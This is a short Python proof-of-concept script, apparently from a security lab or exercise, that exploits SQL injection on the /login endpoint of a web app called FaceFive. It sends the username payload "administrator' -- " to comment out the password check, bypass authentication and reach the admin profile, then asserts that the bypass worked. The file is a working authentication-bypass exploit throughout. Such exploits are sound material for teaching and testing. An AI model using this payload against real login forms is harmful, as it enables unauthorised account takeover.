# vuln5.py

# PoC for SQL injection on the /login endpoint
#
# The login form allows an attacker to login with any account with a known username

from tools import *
import sys
import os

debug = 'DEBUG' in os.environ and os.environ['DEBUG'] == '1'

url = sys.argv[1]

session = FaceFiveSession(url)

user = "administrator' -- "
passwd = 'testpasswd'

reset_image(session)
mainPage = login(session, user, passwd)
print(mainPage.text)

assert "Profile (Admin)" in mainPage.text
